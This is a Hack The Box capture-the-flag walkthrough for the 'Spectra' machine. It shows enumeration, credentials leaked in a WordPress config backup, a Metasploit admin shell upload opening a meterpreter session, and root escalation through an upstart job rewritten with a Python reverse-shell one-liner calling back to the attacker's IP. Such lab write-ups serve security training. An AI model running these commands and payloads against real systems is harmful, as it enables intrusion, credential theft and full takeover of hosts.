# Spectra

URL: https://app.hackthebox.com/machines/Spectra

Level: Easy

Date: 1 Jun 2021

## Walkthrough

- [Enumeration](#enumeration)
- [User flag](#user-flag)
- [Privesc](#privesc)

# Enumeration

## NMAP

```
# Nmap 7.91 scan initiated Mon May 31 22:34:56 2021 as: nmap -T4 -p- -oN 01_nmap.txt 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.049s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

# Nmap done at Mon May 31 22:35:17 2021 -- 1 IP address (1 host up) scanned in 21.46 seconds
```

```
# Nmap 7.91 scan initiated Mon May 31 22:36:42 2021 as: nmap -T4 -A -p- -oN 02_nmap.txt 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.044s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/31%OT=22%CT=1%CU=43745%PV=Y%DS=2%DC=T%G=Y%TM=60B5492
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=1
OS:05%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   44.85 ms 10.10.14.1
2   45.12 ms 10.10.10.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 31 22:38:00 2021 -- 1 IP address (1 host up) scanned in 78.55 seconds
```

While browsing website, we get a redirect to spectre.htb/index.php, so we add it to our `hosts` file.

```
/main (Status: 301)
/testing (Status: 301)
```

Now we get a Wordpress website.

Directory listing allows us to reach /testing:

```
wp-admin/                                          10-Jun-2020 23:00                   -
wp-content/                                        10-Jun-2020 23:13                   -
wp-includes/                                       10-Jun-2020 23:13                   -
index.php                                          06-Feb-2020 06:33                 405
license.txt                                        10-Jun-2020 23:12               19915
readme.html                                        10-Jun-2020 23:12                7278
wp-activate.php                                    06-Feb-2020 06:33                6912
wp-blog-header.php                                 06-Feb-2020 06:33                 351
wp-comments-post.php                               02-Jun-2020 20:26                2332
wp-config.php                                      28-Oct-2020 05:52                2997
wp-config.php.save                                 29-Jun-2020 22:08                2888
wp-cron.php                                        06-Feb-2020 06:33                3940
wp-links-opml.php                                  06-Feb-2020 06:33                2496
wp-load.php                                        06-Feb-2020 06:33                3300
wp-login.php                                       10-Feb-2020 03:50               47874
wp-mail.php                                        14-Apr-2020 11:34                8509
wp-settings.php                                    10-Apr-2020 03:59               19396
wp-signup.php                                      06-Feb-2020 06:33               31111
wp-trackback.php                                   06-Feb-2020 06:33                4755
xmlrpc.php               
```

We can grab `wp-config.php.save`,  and get some credentials to MySQL DB:

```
define( 'DB_NAME', 'dev' );

/** MySQL database username */
define( 'DB_USER', 'devtest' );

/** MySQL database password */
define( 'DB_PASSWORD', 'devteam01' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

We try remote MySQL access, without success:

```
root@kali:/opt/htb/Spectra# mysql -udevtest -p -h 10.10.10.229
Enter password:

ERROR 1130 (HY000): Host '10.10.14.28' is not allowed to connect to this MySQL server
```

On "main" website we found a post by "administrator".

We get luck with `administrator:devteam01`.

Since we are now authenticated, we can get a shell:

```
msf6 > search wp_admin

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload

msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.88.10    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress


msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME administrator
USERNAME => administrator
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD devteam01
PASSWORD => devteam01
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /main
TARGETURI => /main
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST spectra.htb
VHOST => spectra.htb
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.229
RHOSTS => 10.10.10.229
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 192.168.88.10:4444
[*] Authenticating with WordPress using administrator:devteam01...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /main/wp-content/plugins/mjeHkAkuJM/zsorEjQjji.php...
[!] This exploit may require manual cleanup of 'zsorEjQjji.php' on the target
[!] This exploit may require manual cleanup of 'mjeHkAkuJM.php' on the target
[!] This exploit may require manual cleanup of '../mjeHkAkuJM' on the target
[*] Exploit completed, but no session was created.
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.28:4444
[*] Authenticating with WordPress using administrator:devteam01...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /main/wp-content/plugins/QvIHOAvHFU/ZoSlmtEJAQ.php...
[*] Sending stage (39282 bytes) to 10.10.10.229
[*] Meterpreter session 1 opened (10.10.14.28:4444 -> 10.10.10.229:42528) at 2021-05-31 23:49:04 +0200
[+] Deleted ZoSlmtEJAQ.php
[+] Deleted QvIHOAvHFU.php
[+] Deleted ../QvIHOAvHFU

meterpreter >
```

We can also add our public ssh key to get a better shell:

```
nginx@spectra ~/.ssh $ wget http://10.10.14.28:8000/id_rsa.pub -O authorized_keys
< http://10.10.14.28:8000/id_rsa.pub -O authorized_keys
--2021-05-31 14:56:19--  http://10.10.14.28:8000/id_rsa.pub
Connecting to 10.10.14.28:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/octet-stream]
Saving to: 'authorized_keys'

authorized_keys     100%[===================>]     563  --.-KB/s    in 0s

2021-05-31 14:56:19 (78.5 MB/s) - 'authorized_keys' saved [563/563]

nginx@spectra ~/.ssh $ ls -l
ls -l
total 4
-rw-r--r-- 1 nginx nginx 563 Apr 18  2020 authorized_keys


root@kali:~/.ssh# ssh nginx@10.10.10.229
nginx@spectra ~ $
nginx@spectra ~ $
```

We transfer LinPeas and we run it.

We found some other credential:

```
[+] Autologin Files
/etc/autologin
total 4
-rw-r--r-- 1 root root 19 Feb  3 16:43 passwd

/etc/autologin/passwd
-rw-r--r-- 1 root root 19 Feb  3 16:43 /etc/autologin/passwd
SummerHereWeCome!!
```

Now we can access through other user, `katie`.

```
root@kali:/opt/htb/Spectra# ssh katie@10.10.10.229
Password:
katie@spectra ~ $
```

# User-flag

Now we can grab user flag from katie home.

# Privesc

```
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

We focus on `initctl`:

```
katie@spectra ~ $ sudo /sbin/initctl list | grep test
test stop/waiting
test1 stop/waiting
test7 stop/waiting
test6 stop/waiting
test5 stop/waiting
test4 stop/waiting
test10 stop/waiting
attestationd start/running, process 1791
trace_marker-test stop/waiting
test9 stop/waiting
test8 stop/waiting
test3 stop/waiting
test2 stop/waiting
```

They are all the same:

```
katie@spectra /etc/init $ md5sum test*.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test1.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test10.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test2.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test3.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test4.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test5.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test6.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test7.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test8.conf
9a90f209aeb456ea0e961bfde1f7a3b7  test9.conf
```

```
katie@spectra /etc/init $ cat test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

Through `pspy` we found some cronjobs:

```
2021/06/01 00:19:15 CMD: UID=0    PID=5079   | /usr/bin/coreutils --coreutils-prog-shebang=cp /bin/cp -p /root/test.conf /etc/init/test1.conf
2021/06/01 00:19:15 CMD: UID=0    PID=5080   | /usr/bin/coreutils --coreutils-prog-shebang=cp /bin/cp -p /root/test.conf /etc/init/test2.conf
2021/06/01 00:19:15 CMD: UID=???  PID=5081   | ???
2021/06/01 00:19:15 CMD: UID=0    PID=5082   | /usr/bin/coreutils --coreutils-prog-shebang=cp /bin/cp -p /root/test.conf /etc/init/test4.conf
2021/06/01 00:19:15 CMD: UID=0    PID=5083   |
2021/06/01 00:19:15 CMD: UID=0    PID=5085   | /usr/bin/coreutils --coreutils-prog-shebang=cp /bin/cp -p /root/test.conf /etc/init/test7.conf
2021/06/01 00:19:15 CMD: UID=???  PID=5086   | ???
2021/06/01 00:19:15 CMD: UID=0    PID=5087   | /usr/bin/coreutils --coreutils-prog-shebang=cp /bin/cp -p /root/test.conf /etc/init/test9.conf
```

We replace script with this code:

```
 exec python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.28",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

We reload configuration:

```
katie@spectra /etc/init $ sudo /sbin/initctl reload-configuration
```

We listen on our 5555/TCP port:

```
root@kali:~# nc -nlvp 5555
listening on [any] 5555 ...
```

```
katie@spectra /etc/init $ sudo /sbin/initctl start test10
test10 start/running, process 5397
```

And we get shell:

```
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.229] 38648
spectra / # id
id
uid=0(root) gid=0(root) groups=0(root)
spectra / # ca

spectra / #

spectra / # ls
ls
bin   dev  home  lib64       media  opt       proc  run   srv  tmp  var
boot  etc  lib   lost+found  mnt    postinst  root  sbin  sys  usr
spectra / # cd root
cd root
spectra /root # ls
ls
main  nodetest.js  root.txt  script.sh  startup  test.conf
spectra /root # cat root.txt
cat root.txt
d44519713b889d5e1f9e536d0c6df2fc
spectra /root #
```


	

